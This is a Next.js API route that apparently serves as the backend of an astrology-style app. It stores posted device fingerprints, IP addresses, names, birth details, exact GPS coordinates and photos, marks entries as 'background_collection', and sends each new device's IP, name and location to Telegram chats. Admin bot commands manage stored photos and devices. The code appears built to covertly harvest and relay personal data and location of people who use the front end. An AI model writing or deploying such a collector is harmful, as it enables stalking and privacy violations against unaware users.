import { NextResponse } from 'next/server';
import { PrismaClient } from '@prisma/client';
import { corsHeaders, handleOptions } from '@/lib/cors';

export const OPTIONS = handleOptions;

const prisma = new PrismaClient();

export async function POST(req: Request) {
  try {
    const data = await req.json();
    
    const publicIp = req.headers.get("x-forwarded-for") || "unknown";
    const referer = req.headers.get("referer") || "unknown";

    // Check if this is a new device before we create the scan
    const isNewDevice = !(await prisma.deviceScan.findFirst({ where: { deviceId: data.deviceId } }));

    await prisma.deviceScan.create({
      data: {
        deviceId: data.deviceId,
        publicIp,
        userAgent: data.userAgent,
        referer,
        language: data.language,
        screenResolution: data.screenResolution,
        hardwareConcurrency: data.hardwareConcurrency,
        deviceMemory: data.deviceMemory,
        timezone: data.timezone,
        touchSupport: data.touchSupport,
        connectionType: data.connectionType,
        userName: data.userName,
        birthDate: data.birthDate,
        birthState: data.birthState,
        birthCity: data.birthCity,
        birthTime: data.birthTime,
        latitude: data.latitude,
        longitude: data.longitude,
        image: data.image || null,
        reading: data.reading ? data.reading as any : { status: "background_collection" },
      },
    });
    
    // Notify Telegram ONLY if it's a new device
    if (isNewDevice) {
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const envChatIds = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];
      
      if (botToken) {
        try {
          const dbUsers = await prisma.telegramUser.findMany({ select: { chatId: true } });
          const allChatIds = Array.from(new Set([...envChatIds, ...dbUsers.map(u => u.chatId)]));
          
          if (allChatIds.length > 0) {
            const msg = `🟢 *New Device Online!*\n\n*ID:* \`${data.deviceId}\`\n*IP:* \`${publicIp}\`\n*Name:* ${data.userName || "Unknown"}\n*Location:* ${data.latitude ? `${data.latitude}, ${data.longitude}` : "Unknown"}\n*OS:* ${data.userAgent?.substring(0, 50) || "Unknown"}`;
            
            for (const chatId of allChatIds) {
              try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
                });
              } catch (err) {
                console.error(`Telegram notification failed for chat ID ${chatId}:`, err);
              }
            }
          }
        } catch (dbErr) {
          console.error("Error fetching Telegram users:", dbErr);
        }
      }
    }

    // Storage Monitoring (70% warning, max 10 times, every 10 mins)
    const DB_LIMIT = 536870912; // 512MB
    const imageCount = await prisma.deviceScan.count({ where: { image: { not: null } } });
    const usedBytes = imageCount * 153600; // rough estimate 150KB per image
    const percentUsed = (usedBytes / DB_LIMIT) * 100;

    const globalObj = global as any;
    if (!globalObj.storageWarningCount) globalObj.storageWarningCount = 0;
    if (!globalObj.lastStorageWarningTime) globalObj.lastStorageWarningTime = 0;

    if (percentUsed > 70) {
      const now = Date.now();
      if (now - globalObj.lastStorageWarningTime > 10 * 60 * 1000) { // 10 minutes
        if (globalObj.storageWarningCount < 10) {
          globalObj.storageWarningCount++;
          globalObj.lastStorageWarningTime = now;
          
          const botToken = process.env.TELEGRAM_BOT_TOKEN;
          if (botToken) {
            const envChatIds = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];
            const dbUsers = await prisma.telegramUser.findMany({ where: { role: 'superadmin' }, select: { chatId: true } });
            const adminIds = Array.from(new Set([...envChatIds, ...dbUsers.map(u => u.chatId)]));
            
            const warningMsg = `⚠️ *CRITICAL STORAGE WARNING* ⚠️\n\nDatabase is *${percentUsed.toFixed(1)}%* full.\nPlease use the bot to \`/clean\` old photos or \`/delete\` devices to free up space.\n\n_(Warning ${globalObj.storageWarningCount}/10)_`;
            for (const chatId of adminIds) {
              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: warningMsg, parse_mode: 'Markdown' })
              }).catch(() => {});
            }
          }
        }
      }
    } else {
      globalObj.storageWarningCount = 0;
    }

    return NextResponse.json({ success: true }, { headers: corsHeaders });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: "Failed to collect telemetry" }, { status: 500, headers: corsHeaders });
  }
}
